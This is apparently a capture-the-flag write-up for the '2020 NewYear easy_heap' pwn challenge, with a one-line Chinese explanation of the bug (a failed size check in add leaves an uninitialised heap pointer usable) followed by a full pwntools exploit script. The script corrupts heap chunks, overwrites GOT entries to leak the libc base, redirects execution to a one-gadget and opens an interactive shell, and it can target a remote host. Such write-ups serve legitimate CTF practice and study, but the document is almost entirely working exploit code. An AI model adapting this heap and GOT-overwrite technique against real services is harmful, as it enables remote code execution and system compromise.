easy_heap

---
title: 2020 NewYear easy_heap
date: 2020.03.21 19:14
tags:
- logic
categories:
- pwn       #分类
- Libc    #二级目录
top:
---
add功能里如果size不符合要求，不会退出程序，这时，堆不会进行初始化，但是，指针却可以使用，进而造成问题。
```
#coding=utf-8

##########################################################################
# File Name: pwn_exp.py
# Author: sofr
# mail: rainb0w.541.bai@gmail.com
# Created Time: Sat Mar  7 01:14:58 2020
#########################################################################

from pwn import *
import sys
context.log_level = 'debug'

r = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
s = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sf = lambda x,y:p.sendafter(x,y)
slf = lambda x,y:p.sendlineafter(x,y)
l64_addr = lambda x:u64(x.ljust(0x8,'\x00'))
l32_addr = lambda x:u32(x.ljust(0x4,'\x00'))
drop_end = lambda x,y:x.split(y)[0]
getshell = lambda :p.interactive()

binary='./easyheap'
libc_name = '/lib/x86_64-linux-gnu/libc.so.6'

global p
libc = ELF(libc_name)
bin = ELF(binary)

if len(sys.argv) > 1:
    p=remote(sys.argv[1],int(sys.argv[2]))
else:
    p=process([binary],env={'LD_PRELOAD':libc_name})

def ShowAddress(s,addr):
    print('\033[1;31m%s: 0x%x\033[0m'%(s,addr))

def Success(context):
    success('\033[1;32m%s\033[0m'%(context))

def Error(context):
    warn('\033[1;31m%s\033[0m'%(context))

def debug():
    Success(pidof(p))
    raw_input('\033[1;31mDeBug\033[0m')

def add(size,content):
    slf("Your choice:","1")
    slf("How long is this message?",str(size))
    if size < 0x400:
        sf("What is the content of the message?",content)

def dele(idx):
    slf("Your choice:","2")
    slf("What is the index of the item to be deleted?",str(idx))

def edit(idx,content):
    slf("Your choice:","3")
    slf("What is the index of the item to be modified?",str(idx))
    sf("What is the content of the message?",content)

def pwn():
    add(0x100,"a")
    add(0x20,p64(0)+p64(0x21))
    add(0x20,"123")
    dele(1)
    dele(2)
    add(0x401,"aa")
    add(0x401,"aa")
    dele(0)
    add(0x40,"\x20")
    
    edit(1,p64(0)+p64(0x21)+p64(0x0602018)+p64(0x20))
    edit(2,p64(0x400670))
    dele(0)
    ru("\n")
    libc_addr = l64_addr(ru('\n')[:-1]) - 0x3c4c20
    ShowAddress("libc",libc_addr)
    edit(1,p64(0)+p64(0x21)+p64(0x0602050)+p64(0x20))
    edit(2,p64(libc_addr + 0x45390))
    #dele(1)
    debug()
    getshell()


pwn()

```